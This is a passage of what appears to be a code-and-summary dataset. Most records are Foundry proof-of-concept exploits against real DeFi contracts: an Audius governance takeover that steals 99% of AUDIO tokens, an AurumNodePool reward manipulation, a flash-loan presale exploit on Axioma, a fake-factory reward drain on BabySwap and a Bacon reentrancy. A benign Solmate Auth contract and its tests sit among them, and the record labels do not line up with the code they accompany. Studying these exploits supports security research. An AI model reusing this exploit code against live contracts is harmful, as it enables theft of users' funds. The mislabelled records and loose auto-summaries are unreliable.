_description) external returns (uint256);\n    function submitVote(uint256 _proposalId, Vote _vote) external;\n}\n\ninterface IStaking {\n    function initialize(address _tokenAddress, address _governanceAddress) external;\n}\ninterface IDelegateManagerV2 {\n    function initialize(address _tokenAddress, address _governanceAddress, uint256 _undelegateLockupDuration) external;\n    function setServiceProviderFactoryAddress(address _spFactory) external;\n    function delegateStake(address _targetSP, uint256 _amount) external returns (uint256);\n}\n\n/* Contract: 0xf70f691d30ce23786cfb3a1522cfd76d159aca8d */\ncontract AttackContract is Test {\n    address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n\n    function setUp() public {\n        cheat.createSelectFork(\"mainnet\", 15201793);    // Fork mainnet at block 15201793\n        cheat.label(AUDIO, \"AUDIO\");\n        cheat.label(uniswap, \"UniswapV2Router02\");\n        cheat.label(governance, \"GovernanceProxy\");\n        cheat.label(staking, \"Stacking\");\n        cheat.label(delegatemanager, \"DelegateManagerV2\");\n    }\n\n    function testExploit() public {\n        console.log(\"---------- Start from Block %s ----------\", block.number);\n        emit log_named_decimal_uint(\"Attacker ETH Balance\", attacker.balance, 18);\n\n        console.log(\"-------------------- Tx1 --------------------\");\n        console.log(\"Modify configurations...\");\n        console.log(\"-> votingPeriod : 3 blocks\");\n        console.log(\"-> executionDelay : 0 block\");\n        console.log(\"-> guardianAddress : self\");\n        // function initialize(\n            // address _registryAddress,\n            // uint256 _votingPeriod,\n            // uint256 _executionDelay,\n            // uint256 _votingQuorumPercent,\n            // uint16 _maxInProgressProposals,\n            // address _guardianAddress\n        // )\n        IGovernence(governance).initialize(address(this), 3, 0, 1, 4, address(this));\n        \n        console.log(\"Evaluate Proposal...\"); // this is to make sure one can submit new proposals\n        IGovernence(governance).evaluateProposalOutcome(84);    // callback this.getContract()\n        \n        uint256 audioBalance_gov = IERC20(AUDIO).balanceOf(governance);\n        uint256 stealAmount = audioBalance_gov * 99 / 1e2;   // Steal 99% of AUDIO Token from governance address\n\n        console.log(\"Submit Proposal...\");\n        // function submitProposal(\n        //     bytes32 _targetContractRegistryKey,\n        //     uint256 _callValue,\n        //     string calldata _functionSignature,\n        //     bytes calldata _callData,\n        //     string calldata _name,\n        //     string calldata _description\n        // ) external returns (uint256)\n        IGovernence(governance).submitProposal(bytes32(uint(3078)), 0, \"transfer(address,uint256)\", abi.encode(address(this), stealAmount), \"Hello\", \"World\");\n\n        IStaking(staking).initialize(address(this), address(this));\n        IDelegateManagerV2(delegatemanager).initialize(address(this), address(this), 1);\n        IDelegateManagerV2(delegatemanager).setServiceProviderFactoryAddress(address(this));\n        IDelegateManagerV2(delegatemanager).delegateStake(address(this), 1e31);\n\n        console.log(\"-------------------- Tx2 --------------------\");\n        console.log(\"SubmitVote `Yes` for malicious ProposalId 85...\");\n        cheat.roll(15201795);\n        IGovernence(governance).submitVote(85, IGovernence.Vote(2));    // Voting Yes\n\n        console.log(\"-------------------- Tx3 --------------------\");\n        console.log(\"Execute malicious ProposalId 85...\");\n        cheat.roll(15201798);\n        IGovernence(governance).evaluateProposalOutcome(85);    // callback this.getContract()\n        uint256 audioBalance_this = IERC20(AUDIO).balanceOf(address(this));\n        emit log_named_decimal_uint(\"AttackContract AUDIO Balance\", audioBalance_this, 18);\n\n        console.log(\"-------------------- Tx4 --------------------\");\n        console.log(\"AUDIO/ETH Swap...\");\n        address[] memory path = new address[](2);\n        path[0] = AUDIO;\n        path[1] = weth;\n        IERC20(AUDIO).approve(uniswap, 1e40);\n        IUniswapV2Router(uniswap).swapExactTokensForETH(audioBalance_this, 680 ether, path, attacker, block.timestamp);\n\n        console.log(\"-------------------- End --------------------\");\n        emit log_named_decimal_uint(\"Attacker ETH Balance\", attacker.balance, 18);\n\n    }\n\n    /* Tx1 callback functions */\n    function getContract(bytes32 _targetContractRegistryKey) external returns(address) { return AUDIO; }\n    function isGovernanceAddress() external view returns(bool) { return true; }\n    function getExecutionDelay() external view returns(uint) { return 0; }\n    function getVotingPeriod() external view returns(uint) { return 0; }\n    function transferFrom(address, address, uint256) external pure returns(bool) { return true; }\n    function validateAccountStakeBalance(address) external pure {}\n\n  receive() external payable {}\n}\n",
        "summary": "This is a Solidity smart contract that was used to execute an exploit on the Audius governance system. The code imports an interface for the governance contract, staking contract, and delegate manager. It also includes addresses for different contracts, such as the governance contract (proxy), the staking contract (proxy), and the UniswapV2 Router 2. \n\nThe `AttackContract` contract initializes a cheat code library and sets up a test exploit on the Audius governance system. The exploit consists of using a backdoor in the governance contract to steal 99% of Audio tokens from the governance contract, submitting a malicious proposal to the governance contract to transfer the stolen Audio tokens to the attacker's address, voting 'yes' on the malicious proposal, executing the malicious proposal to transfer the Audio tokens to the attacker's address, and swapping the stolen Audio tokens for Ether on the UniswapV2 Router 2. \n\nOverall, this code implements a malicious operation to steal Audio tokens from the Audius governance system.",
        "id": "5a1d4b5b-bd81-4e12-9f2a-d8a1f27e9dc3",
        "api_seq": "AUR_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n\n// @Analysis\n// https://twitter.com/AnciliaInc/status/1595142246570958848\n// @TX\n// https://phalcon.blocksec.com/tx/bsc/0xb3bc6ca257387eae1cea3b997eb489c1a9c208d09ec4d117198029277468e25d\n// https://phalcon.blocksec.com/tx/bsc/0x7f031e8543e75bd5c85168558be89d2e08b7c02a32d07d76517cdbb10e279782\ninterface IAurumNodePool {\n    struct NodeEntity {\n        uint256 nodeId;\n        uint256 creationTime;\n        uint256 lastClaimTime; \n    }\n\n    function createNode(uint256 count) external;\n    function changeNodePrice(uint256 newNodePrice) external;\n    function changeRewardPerNode(uint256 _rewardPerDay) external;\n    function claimNodeReward(uint256 _creationTime) external;\n\n    function getRewardAmountOf(address account, uint256 creationTime) external view returns (uint256);\n    function getNodes(address account) external view returns(NodeEntity[] memory nodes);\n}\n\ncontract ContractTest is DSTest{\n    IERC20 AUR = IERC20(0x73A1163EA930A0a67dFEFB9C3713Ef0923755B78);\n    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n\n    IAurumNodePool AurumNodePool = IAurumNodePool(0x70678291bDDfd95498d1214BE368e19e882f7614);\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 23282134);\n        cheats.deal(address(this), 0.01 ether);\n    }\n\n    function testExploit() public {\n        AUR.approve(address(AurumNodePool), type(uint).max);\n        AUR.approve(address(Router), type(uint).max);\n\n        emit log_named_decimal_uint(\n            \"[Start] Attacker BNB balance before exploit\",\n            address(this).balance,\n            18\n        );\n\n        BNBtoAUR(0.01 ether);\n\n        AurumNodePool.changeNodePrice(1000000000000000000000);\n        AurumNodePool.createNode(1);\n\n        IAurumNodePool.NodeEntity[] memory nodes = AurumNodePool.getNodes(address(this));\n\n        cheats.roll(23282171);\n        cheats.warp(1669141486);\n\n        AurumNodePool.changeRewardPerNode(434159898144856792986061626032);\n\n        emit log_named_uint(\n            \"AurumNodePool Attacker reward:\",\n            AurumNodePool.getRewardAmountOf(address(this), nodes[0].creationTime)\n        );\n\n        require(block.timestamp > nodes[0].lastClaimTime);\n\n        AurumNodePool.claimNodeReward(nodes[0].creationTime);\n\n        AURtoBNB();\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker BNB balance after exploit\",\n            address(this).balance,\n            18\n        );\n    }\n\n    function BNBtoAUR(uint amount) internal {\n        address [] memory path = new address[](2);\n        path[0] = address(WBNB);\n        path[1] = address(AUR);\n        Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(\n            0,\n            path,\n            address(this),\n            block.timestamp + 60\n        );\n    }\n\n    function AURtoBNB() internal {\n        address [] memory path = new address[](2);\n        path[0] = address(AUR);\n        path[1] = address(WBNB);\n        Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n            AUR.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp + 60\n        );\n    }\n\n    fallback() external payable{\n\n    }\n}",
        "summary": "This code defines a Solidity contract named \"ContractTest\" which includes a function named \"testExploit\". The contract imports multiple other contracts including \"interface.sol\", which defines a contract interface \"IAurumNodePool\", and \"Uni_Router_V2\", which is a contract from the Uniswap decentralized exchange. \n\nIn the \"testExploit\" function, the contract owner approves the \"AUR\" token to be spent by the AurumNodePool and Router contracts, then converts 0.01 BNB to AUR using Uniswap's Router. The function then calls several functions from the IAurumNodePool interface to change the pool's configuration, create a node, get reward information, and claim rewards for the newly created node. Finally, the function converts the remaining AUR back to BNB using Uniswap's Router and emits the balance of the contract's BNB before and after the exploit. \n\nOverall, the purpose of this code appears to be to exploit some vulnerability in the AurumNodePool contract in order to gain rewards. However, without knowledge of the specifics of the vulnerability or the AurumNodePool contract itself, it is impossible to determine the exact nature of the exploit.",
        "id": "61262673-ea1b-48a0-b5b2-15a2be635744",
        "api_seq": "Auth"
    },
    {
        "code": "// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity >=0.8.0;\n\n/// @notice Provides a flexible and updatable auth pattern which is completely separate from application logic.\n/// @author Solmate (https://github.com/transmissions11/solmate/blob/main/src/auth/Auth.sol)\n/// @author Modified from Dappsys (https://github.com/dapphub/ds-auth/blob/master/src/auth.sol)\nabstract contract Auth {\n    event OwnershipTransferred(address indexed user, address indexed newOwner);\n\n    event AuthorityUpdated(address indexed user, Authority indexed newAuthority);\n\n    address public owner;\n\n    Authority public authority;\n\n    constructor(address _owner, Authority _authority) {\n        owner = _owner;\n        authority = _authority;\n\n        emit OwnershipTransferred(msg.sender, _owner);\n        emit AuthorityUpdated(msg.sender, _authority);\n    }\n\n    modifier requiresAuth() virtual {\n        require(isAuthorized(msg.sender, msg.sig), \"UNAUTHORIZED\");\n\n        _;\n    }\n\n    function isAuthorized(address user, bytes4 functionSig) internal view virtual returns (bool) {\n        Authority auth = authority; // Memoizing authority saves us a warm SLOAD, around 100 gas.\n\n        // Checking if the caller is the owner only after calling the authority saves gas in most cases, but be\n        // aware that this makes protected functions uncallable even to the owner if the authority is out of order.\n        return (address(auth) != address(0) && auth.canCall(user, address(this), functionSig)) || user == owner;\n    }\n\n    function setAuthority(Authority newAuthority) public virtual {\n        // We check if the caller is the owner first because we want to ensure they can\n        // always swap out the authority even if it's reverting or using up a lot of gas.\n        require(msg.sender == owner || authority.canCall(msg.sender, address(this), msg.sig));\n\n        authority = newAuthority;\n\n        emit AuthorityUpdated(msg.sender, newAuthority);\n    }\n\n    function transferOwnership(address newOwner) public virtual requiresAuth {\n        owner = newOwner;\n\n        emit OwnershipTransferred(msg.sender, newOwner);\n    }\n}\n\n/// @notice A generic interface for a contract which provides authorization data to an Auth instance.\n/// @author Solmate (https://github.com/transmissions11/solmate/blob/main/src/auth/Auth.sol)\n/// @author Modified from Dappsys (https://github.com/dapphub/ds-auth/blob/master/src/auth.sol)\ninterface Authority {\n    function canCall(\n        address user,\n        address target,\n        bytes4 functionSig\n    ) external view returns (bool);\n}\n",
        "summary": "This code is a smart contract called Auth that provides a flexible and updatable authorization pattern that is separate from the application logic. The contract has an abstract modifier which means it cannot be deployed on its own and must be inherited by another contract. The contract has an owner and an Authority contract variable that is used to properly authorize function calls. There are several events defined in the contract that keep track of changes in ownership and authority. The code also includes an Authority interface, which is a generic interface for a contract that provides authorization data to the Auth instance.",
        "id": "20c09225-63a8-4505-9daf-3d5c0f9266db",
        "api_seq": "Auth.t"
    },
    {
        "code": "// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity 0.8.15;\n\nimport {DSTestPlus} from \"./utils/DSTestPlus.sol\";\nimport {MockAuthChild} from \"./utils/mocks/MockAuthChild.sol\";\nimport {MockAuthority} from \"./utils/mocks/MockAuthority.sol\";\n\nimport {Authority} from \"../auth/Auth.sol\";\n\ncontract OutOfOrderAuthority is Authority {\n    function canCall(\n        address,\n        address,\n        bytes4\n    ) public pure override returns (bool) {\n        revert(\"OUT_OF_ORDER\");\n    }\n}\n\ncontract AuthTest is DSTestPlus {\n    MockAuthChild mockAuthChild;\n\n    function setUp() public {\n        mockAuthChild = new MockAuthChild();\n    }\n\n    function testTransferOwnershipAsOwner() public {\n        mockAuthChild.transferOwnership(address(0xBEEF));\n        assertEq(mockAuthChild.owner(), address(0xBEEF));\n    }\n\n    function testSetAuthorityAsOwner() public {\n        mockAuthChild.setAuthority(Authority(address(0xBEEF)));\n        assertEq(address(mockAuthChild.authority()), address(0xBEEF));\n    }\n\n    function testCallFunctionAsOwner() public {\n        mockAuthChild.updateFlag();\n    }\n\n    function testTransferOwnershipWithPermissiveAuthority() public {\n        mockAuthChild.setAuthority(new MockAuthority(true));\n        mockAuthChild.transferOwnership(address(0));\n        mockAuthChild.transferOwnership(address(this));\n    }\n\n    function testSetAuthorityWithPermissiveAuthority() public {\n        mockAuthChild.setAuthority(new MockAuthority(true));\n        mockAuthChild.transferOwnership(address(0));\n        mockAuthChild.setAuthority(Authority(address(0xBEEF)));\n    }\n\n    function testCallFunctionWithPermissiveAuthority() public {\n        mockAuthChild.setAuthority(new MockAuthority(true));\n        mockAuthChild.transferOwnership(address(0));\n        mockAuthChild.updateFlag();\n    }\n\n    function testSetAuthorityAsOwnerWithOutOfOrderAuthority() public {\n        mockAuthChild.setAuthority(new OutOfOrderAuthority());\n        mockAuthChild.setAuthority(new MockAuthority(true));\n    }\n\n    function testFailTransferOwnershipAsNonOwner() public {\n        mockAuthChild.transferOwnership(address(0));\n        mockAuthChild.transferOwnership(address(0xBEEF));\n    }\n\n    function testFailSetAuthorityAsNonOwner() public {\n        mockAuthChild.transferOwnership(address(0));\n        mockAuthChild.setAuthority(Authority(address(0xBEEF)));\n    }\n\n    function testFailCallFunctionAsNonOwner() public {\n        mockAuthChild.transferOwnership(address(0));\n        mockAuthChild.updateFlag();\n    }\n\n    function testFailTransferOwnershipWithRestrictiveAuthority() public {\n        mockAuthChild.setAuthority(new MockAuthority(false));\n        mockAuthChild.transferOwnership(address(0));\n        mockAuthChild.transferOwnership(address(this));\n    }\n\n    function testFailSetAuthorityWithRestrictiveAuthority() public {\n        mockAuthChild.setAuthority(new MockAuthority(false));\n        mockAuthChild.transferOwnership(address(0));\n        mockAuthChild.setAuthority(Authority(address(0xBEEF)));\n    }\n\n    function testFailCallFunctionWithRestrictiveAuthority() public {\n        mockAuthChild.setAuthority(new MockAuthority(false));\n        mockAuthChild.transferOwnership(address(0));\n        mockAuthChild.updateFlag();\n    }\n\n    function testFailTransferOwnershipAsOwnerWithOutOfOrderAuthority() public {\n        mockAuthChild.setAuthority(new OutOfOrderAuthority());\n        mockAuthChild.transferOwnership(address(0));\n    }\n\n    function testFailCallFunctionAsOwnerWithOutOfOrderAuthority() public {\n        mockAuthChild.setAuthority(new OutOfOrderAuthority());\n        mockAuthChild.updateFlag();\n    }\n\n    function testTransferOwnershipAsOwner(address newOwner) public {\n        mockAuthChild.transferOwnership(newOwner);\n        assertEq(mockAuthChild.owner(), newOwner);\n    }\n\n    function testSetAuthorityAsOwner(Authority newAuthority) public {\n        mockAuthChild.setAuthority(newAuthority);\n        assertEq(address(mockAuthChild.authority()), address(newAuthority));\n    }\n\n    function testTransferOwnershipWithPermissiveAuthority(address deadOwner, address newOwner) public {\n        if (deadOwner == address(this)) deadOwner = address(0);\n\n        mockAuthChild.setAuthority(new MockAuthority(true));\n        mockAuthChild.transferOwnership(deadOwner);\n        mockAuthChild.transferOwnership(newOwner);\n    }\n\n    function testSetAuthorityWithPermissiveAuthority(address deadOwner, Authority newAuthority) public {\n        if (deadOwner == address(this)) deadOwner = address(0);\n\n        mockAuthChild.setAuthority(new MockAuthority(true));\n        mockAuthChild.transferOwnership(deadOwner);\n        mockAuthChild.setAuthority(newAuthority);\n    }\n\n    function testCallFunctionWithPermissiveAuthority(address deadOwner) public {\n        if (deadOwner == address(this)) deadOwner = address(0);\n\n        mockAuthChild.setAuthority(new MockAuthority(true));\n        mockAuthChild.transferOwnership(deadOwner);\n        mockAuthChild.updateFlag();\n    }\n\n    function testFailTransferOwnershipAsNonOwner(address deadOwner, address newOwner) public {\n        if (deadOwner == address(this)) deadOwner = address(0);\n\n        mockAuthChild.transferOwnership(deadOwner);\n        mockAuthChild.transferOwnership(newOwner);\n    }\n\n    function testFailSetAuthorityAsNonOwner(address deadOwner, Authority newAuthority) public {\n        if (deadOwner == address(this)) deadOwner = address(0);\n\n        mockAuthChild.transferOwnership(deadOwner);\n        mockAuthChild.setAuthority(newAuthority);\n    }\n\n    function testFailCallFunctionAsNonOwner(address deadOwner) public {\n        if (deadOwner == address(this)) deadOwner = address(0);\n\n        mockAuthChild.transferOwnership(deadOwner);\n        mockAuthChild.updateFlag();\n    }\n\n    function testFailTransferOwnershipWithRestrictiveAuthority(address deadOwner, address newOwner) public {\n        if (deadOwner == address(this)) deadOwner = address(0);\n\n        mockAuthChild.setAuthority(new MockAuthority(false));\n        mockAuthChild.transferOwnership(deadOwner);\n        mockAuthChild.transferOwnership(newOwner);\n    }\n\n    function testFailSetAuthorityWithRestrictiveAuthority(address deadOwner, Authority newAuthority) public {\n        if (deadOwner == address(this)) deadOwner = address(0);\n\n        mockAuthChild.setAuthority(new MockAuthority(false));\n        mockAuthChild.transferOwnership(deadOwner);\n        mockAuthChild.setAuthority(newAuthority);\n    }\n\n    function testFailCallFunctionWithRestrictiveAuthority(address deadOwner) public {\n        if (deadOwner == address(this)) deadOwner = address(0);\n\n        mockAuthChild.setAuthority(new MockAuthority(false));\n        mockAuthChild.transferOwnership(deadOwner);\n        mockAuthChild.updateFlag();\n    }\n\n    function testFailTransferOwnershipAsOwnerWithOutOfOrderAuthority(address deadOwner) public {\n        if (deadOwner == address(this)) deadOwner = address(0);\n\n        mockAuthChild.setAuthority(new OutOfOrderAuthority());\n        mockAuthChild.transferOwnership(deadOwner);\n    }\n}\n",
        "summary": "This code defines a contract AuthTest that performs various tests on a contract called MockAuthChild. MockAuthChild has functions for transferring ownership and setting an authority, and AuthTest tests different scenarios where these functions are called with various authorities and ownership situations. The purpose of the tests is to ensure that the functions behave as expected under different conditions. The code also imports several helper contracts and libraries.",
        "id": "2c60cc8e-9bda-4c20-8a3e-daed4e1ab13b",
        "api_seq": "Axioma_exp"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n/*\n@Analysis\nhttps://twitter.com/HypernativeLabs/status/1650382589847302145\n1. buy on presale\n2. sale on pancake v2\n@TX\nhttps://bscscan.com/tx/0x05eabbb665a5b99490510d0b3f93565f394914294ab4d609895e525b43ff16f2\n*/\n\ninterface IAxiomaPresale {\n    function buyToken() external payable;\n}\n\ncontract ContractTest is Test {\n\n    address axt = 0xB6CF5b77B92a722bF34f6f5D6B1Fe4700908935E;\n    address axiomaPresale = 0x2C25aEe99ED08A61e7407A5674BC2d1A72B5D8E3;\n    address axt_wbnb_pair = 0x6a3Fa7D2C71fd7D44BF3a2890aA257F34083c90f;\n    address payable pancakeRouter = payable(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    address wbnb_usdt_b = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681; // dodo wbnb-usdt pool\n\n    function setUp() public {\n        vm.createSelectFork(\"bsc\", 27620321 - 1);\n    }\n\n    function testExploit() public {\n        uint256 flashLoanAmount = 32500000000000000000;\n        address wbnb = DVM(wbnb_usdt_b)._BASE_TOKEN_();\n        DVM(wbnb_usdt_b).flashLoan(flashLoanAmount, 0, address(this), abi.encode(wbnb_usdt_b, wbnb, flashLoanAmount));\n    }\n\n    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external{\n        (address wbnb_usdt_b, address wbnb, uint256 flashLoanAmount) = abi.decode(data, (address, address, uint256));\n\n        // 1. buy\n        WETH(wbnb).withdraw(flashLoanAmount);\n        IAxiomaPresale(axiomaPresale).buyToken{value: flashLoanAmount}();\n\n        // 2. sale\n        uint256 axtBalance = IERC20(axt).balanceOf(address(this));\n        bscSwap(axt, wbnb, axtBalance);\n\n        // 3. payback and get profit\n        IERC20(wbnb).transfer(msg.sender, flashLoanAmount);\n        uint256 profit = IERC20(wbnb).balanceOf(address(this));\n        emit log_named_decimal_uint(\"[After Attacks]  Attacker WBNB balance\", profit, 18);\n    }\n\n    fallback() external payable {}\n\n    function bscSwap(address tokenFrom, address tokenTo, uint256 amount) internal {\n        IERC20(tokenFrom).approve(pancakeRouter, type(uint).max);\n        address[] memory path = new address[](2);\n        path[0] = tokenFrom;\n        path[1] = tokenTo;\n        IUniswapV2Router(pancakeRouter).swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);\n    }\n}\n",
        "summary": "This is a Solidity smart contract that performs an exploit on the Binance Smart Chain. The contract imports a test library and an interface, defining an interface for an Axioma Presale contract. It then defines several contract variables, including the Axioma token address, the Axioma Presale contract address, and the Uniswap PancakeRouter contract address.\n\nThe contract has a setUp() function that creates and selects a Binance Smart Chain fork. It also has a testExploit() function that performs a flash loan on a DodoSwap contract, buys Axioma tokens on the Axioma Presale contract, and then sells the tokens on Uniswap PancakeSwap for Binance Coin (BNB). Finally, it pays back the flash loan and sends the profit to the attacker's address.\n\nThe contract also has a DPPFlashLoanCall() function that is called during the flash loan transaction, and a fallback() function that is called when the contract receives any other type of transaction. Additionally, there is a bscSwap() internal function that swaps tokens on PancakeSwap.\n\nOverall, this contract is an example of an exploit on the Binance Smart Chain that demonstrates how an attacker can use a flash loan to manipulate prices on decentralized exchanges and make a profit.",
        "id": "2bca84ed-3483-4679-bbd6-691a1efbdaff",
        "api_seq": "BabySwap_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/BlockSecTeam/status/1576441612812836865\n// @TX\n// https://bscscan.com/tx/0xcca7ea9d48e00e7e32e5d005b57ec3cac28bc3ad0181e4ca208832e62aa52efe\ninterface BabySwapRouter {\n    function swapExactTokensForTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] memory path,\n        address[] memory factories,\n        uint[] memory fees,\n        address to,\n        uint deadline\n    ) external;\n}\n\ninterface SwapMining {\n    function takerWithdraw() external;\n}\n\ncontract FakeFactory {\n    address Owner;\n    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    constructor(){\n        Owner = msg.sender;\n    }\n    // fake pair\n    function getPair(address token1, address token2) external view returns(address pair) {\n        pair = address(this);\n    }\n    // fake pair\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast) {\n        reserve0 = 10_000_000_000 * 1e18;\n        reserve1 = 1;\n        blockTimestampLast = 0;\n    }\n    function swap(\n    uint256 amount0Out,\n    uint256 amount1Out,\n    address to,\n    bytes calldata data\n  ) external{\n    if(WBNB.balanceOf(address(this)) > 0) WBNB.transfer(Owner, WBNB.balanceOf(address(this)));\n    // if(USDT.balanceOf(address(this)) > 0) USDT.transfer(Owner, USDT.balanceOf(address(this)));\n  }\n}\n\ncontract ContractTest is DSTest{\n\n    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IERC20 BABY = IERC20(0x53E562b9B7E5E94b81f10e96Ee70Ad06df3D2657);\n    BabySwapRouter Router = BabySwapRouter(0x8317c460C22A9958c27b4B6403b98d2Ef4E2ad32);\n    SwapMining swapMining = SwapMining(0x5c9f1A9CeD41cCC5DcecDa5AFC317b72f1e49636);\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 21811979);\n    }\n\n    function testExploit() public{\n\n        address(WBNB).call{value: 20_000}(\"\");\n        WBNB.approve(address(Router), type(uint).max);\n        BABY.approve(address(Router), type(uint).max);\n        // create fakefactory\n        FakeFactory factory = new FakeFactory();\n        // swap token to claim reward\n        address [] memory path1 = new address[](2);\n        path1[0] = address(WBNB);\n        path1[1] = address(USDT);\n        address [] memory factories = new address[](1);\n        factories[0] = address(factory);\n        uint [] memory fees = new uint[](1);\n        fees[0] = 0;\n        Router.swapExactTokensForTokens(\n            10_000,\n            0, \n            path1,\n            factories,\n            fees,\n            address(this),\n            block.timestamp\n            );\n        // swap token to claim reward\n        address [] memory path2 = new address[](2);\n        path2[0] = address(WBNB);\n        path2[1] = address(BABY);\n        Router.swapExactTokensForTokens(\n            10_000,\n            0, \n            path2,\n            factories,\n            fees,\n            address(this),\n            block.timestamp\n            );\n        // calim reward token\n        swapMining.takerWithdraw();\n        sellBaby();\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker USDT balance after exploit\",\n            USDT.balanceOf(address(this)),\n            18\n        );\n\n    }\n\n    function sellBaby() internal {\n        address [] memory path = new address[](2);\n        path[0] = address(BABY);\n        path[1] = address(USDT);\n        address [] memory factories = new address[](1);\n        factories[0] = address(0x86407bEa2078ea5f5EB5A52B2caA963bC1F889Da);\n        uint [] memory fees = new uint[](1);\n        fees[0] = 3000;\n        Router.swapExactTokensForTokens(\n            BABY.balanceOf(address(this)),\n            0, \n            path,\n            factories,\n            fees,\n            address(this),\n            block.timestamp\n            );\n    }\n\n\n}",
        "summary": "This code is a Solidity smart contract written for testing purposes. It includes interfaces for BabySwapRouter and SwapMining contracts on the Binance Smart Chain. The FakeFactory contract is also defined, which returns hardcoded values for getPair and getReserves functions and transfers tokens to the owner upon calling the swap function. \n\nThe ContractTest function has a testExploit function defined, which calls the BabySwapRouter to swap WBNB for USDT and BABY tokens, then calls the swapMining to withdraw rewards, and then sells BABY tokens for USDT. \n\nIn summary, this contract is used to test an exploit against the BabySwap protocol on the Binance Smart Chain.",
        "id": "55a1d889-02dc-476f-9622-1a358f3200fb",
        "api_seq": "Bacon_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\n// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!\npragma solidity >=0.7.0 <0.9.0;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ncontract ContractTest is DSTest {\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n  IUniswapV2Pair pair =\n    IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);\n  IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);\n  IBacon bacon = IBacon(0xb8919522331C59f5C16bDfAA6A121a6E03A91F62);\n  uint256 count = 0;\n\n  constructor() {\n    cheats.createSelectFork(\"mainnet\", 14326931); // fork mainnet at block 14326931\n\n    ERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24)\n      .setInterfaceImplementer(\n        address(this),\n        bytes32(\n          0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b\n        ),\n        address(this)\n      );\n  }\n\n  function test() public {\n    emit log_named_uint(\n      \"Before exploit, USDC balance of attacker:\",\n      usdc.balanceOf(msg.sender)\n    );\n    pair.swap(6360000000000, 0, address(this), new bytes(1));\n\n    emit log_named_uint(\n      \"After exploit, USDC balance of attacker:\",\n      usdc.balanceOf(msg.sender)\n    );\n  }\n\n  function uniswapV2Call(\n    address sender,\n    uint256 amount0,\n    uint256 amount1,\n    bytes calldata data\n  ) public {\n    usdc.approve(address(bacon), 10000000000000000000);\n    bacon.lend(2120000000000);\n    bacon.redeem(bacon.balanceOf(address(this)));\n    usdc.transfer(msg.sender, ((amount0 / 997) * 1000) + 10**usdc.decimals());\n    usdc.transfer(tx.origin, usdc.balanceOf(address(this)));\n  }\n\n  function tokensReceived(\n    address operator,\n    address from,\n    address to,\n    uint256 amount,\n    bytes calldata data,\n    bytes calldata operatorData\n  ) public {\n    count += 1;\n    if (count <= 2) {\n      bacon.lend(2120000000000);\n    }\n  }\n}\n",
        "summary": "This code defines a Solidity contract named `ContractTest` that imports other Solidity contracts and interfaces. The contract is meant to test the functionality of a Uniswap V2 pair (`IUniswapV2Pair`) and a lending platform (`IBacon`). \n\nThe `ContractTest` contract has several state variables including `cheats`, `pair`, `usdc`, `bacon`, and `count`. \n\nThe `test()` function emits logs that reflect the USDC balance of an attacker before and after exploiting the `pair` instance. \n\nThe `uniswapV2Call()` function is called when the `pair` instance is interacted with. It approves USDC transfers and interacts with the `bacon` instance to lend and redeem funds. It then transfers USDC funds to the original transaction sender and the current contract. \n\nThe `tokensReceived()` function increments the `count` variable and interacts with the `bacon` instance by lending funds.",
        "id": "2838e80b-1388-4ec5-8531-e89fa92711ea",
        "api_seq": "BadGuysbyRPF_exp"
    },
    {
